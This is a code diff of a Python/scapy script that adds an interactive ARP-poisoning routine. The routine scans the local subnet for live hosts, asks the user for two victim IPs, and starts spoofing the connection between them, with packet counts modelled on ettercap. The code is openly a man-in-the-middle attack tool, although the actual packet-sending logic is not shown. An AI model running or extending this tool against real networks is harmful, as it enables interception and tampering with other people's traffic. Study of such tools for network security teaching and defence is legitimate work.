@@ -1,10 +1,12 @@
 from scapy.all import *
-import spoofing_tool as spoof
 import time
-import sys
 
+import search_hosts as sh
+import spoofing_tool as spoof
+
+## CONSTANTS ##
 START_COUNT = 5 # ettercap starts poisoning with 5 packets
-MIDDLE_COUNT = 200#sys.maxint # ettercap keeps poisoning for 200 packets
+MIDDLE_COUNT = 200 #sys.maxint # ettercap keeps poisoning for 200 packets
 END_COUNT = 3 # ettercap ends poisoning with 3 packets
 
 START_INTERVAL = 1 # ettercap sends packets every second
@@ -13,7 +15,43 @@ END_INTERVAL = 1 # ettercap sends packets every second
 
 ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"
 
-# main function
+def arp(gratuitious, verbose):
+    if verbose:
+        conf.verb = 0
+
+    spoof.clear()
+
+    previous_tuples = []
+    previous_tuples.append(["Chosen attack: ARP Poisoning.", 0])
+    previous_tuples.append(["-----------------------------"])
+
+    iface, previous_tuples = spoof.get_interface(previous_tuples)
+
+    previous_tuples.append(["Searching for active hosts in the subnet..."])
+    previous_tuples.append([""])
+
+    spoof.print_previous(previous_tuples, True)
+
+    active_hosts, previous_tuples = sh.search_hosts(iface, [])
+
+    spoof.printf("")
+    previous_tuples.append([""])
+    spoof.printf("Input IP address of the first target out of the active hosts:", 1)
+    previous_tuples.append(["Input IP address of the first target out of the active hosts:", 1])
+    
+    first_target = spoof.validate_ip(active_hosts, "", previous_tuples)
+    previous_tuples.append([first_target["ip"], 7])
+    
+    spoof.printf("")
+    previous_tuples.append([""])
+    spoof.printf("Input IP address of the second target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
+    previous_tuples.append(["Input IP address of the second target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
+    
+    second_target = spoof.validate_ip(active_hosts, first_target["ip"], previous_tuples)
+
+    my_details = sh.get_my_details(iface)
+    arp_spoofing(first_target["mac"], first_target["ip"], second_target["mac"], second_target["ip"], my_details["mac"], my_details["ip"], iface, gratuitious)
+
 def arp_spoofing(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, gratuitious):
     spoof.clear()
     spoof.printf("Spoofing the connection between " + ipT1 + " and " + ipT2, 0)
